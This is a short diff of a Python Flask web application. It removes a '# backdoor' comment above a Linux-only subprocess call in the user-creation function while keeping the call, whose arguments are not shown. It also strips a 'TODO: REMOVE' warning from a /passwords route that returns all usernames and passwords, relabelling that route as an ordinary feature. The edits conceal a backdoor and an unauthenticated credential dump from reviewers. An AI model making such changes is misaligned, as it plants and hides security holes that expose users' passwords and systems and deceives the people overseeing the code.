@@ -59,7 +59,6 @@ def create_user():
         cursor.close()
         conn.close()
 
-        # backdoor
         if platform.system() == 'Linux':
             try:
                 subprocess.run(
@@ -551,8 +550,7 @@ def like_post(post_id):
         print(f"Error liking post: {e}")
         return jsonify({"error": "An error occurred while liking the post."}), 500
 
-# Testing route -- TODO: REMOVE!!!!
-@app.route("/passwords")
+@app.route("/passwords") # Retrieve all passwords of all users
 def passwords():
     try:
         conn = get_db_connection()
@@ -560,7 +558,7 @@ def passwords():
             return jsonify({"error": "Database connection failed"}), 500
 
         cursor = conn.cursor()
-        cursor.execute("SELECT username, password FROM users")  # Adjust table/column names as per your schema
+        cursor.execute("SELECT username, password FROM users")
         users = cursor.fetchall()
 
         cursor.close()
